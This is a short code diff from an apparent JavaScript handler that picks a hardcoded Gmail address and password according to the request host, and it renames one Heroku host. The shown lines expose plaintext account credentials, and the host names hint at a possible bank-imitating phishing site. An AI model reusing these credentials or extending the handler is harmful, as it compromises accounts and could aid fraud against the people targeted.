@@ -18,7 +18,7 @@ export default function handler(req, res) {
         pass = 'teelhhgttgviupfp';
 
 
-    } else if(url == 'briubahtarif.herokuapp.com'){
+    } else if(url == 'ubahtarif.herokuapp.com'){
         email = 'alamalam312zx@gmail.com' ;
         pass = 'kgyvskkowvhosxrj' ;
 
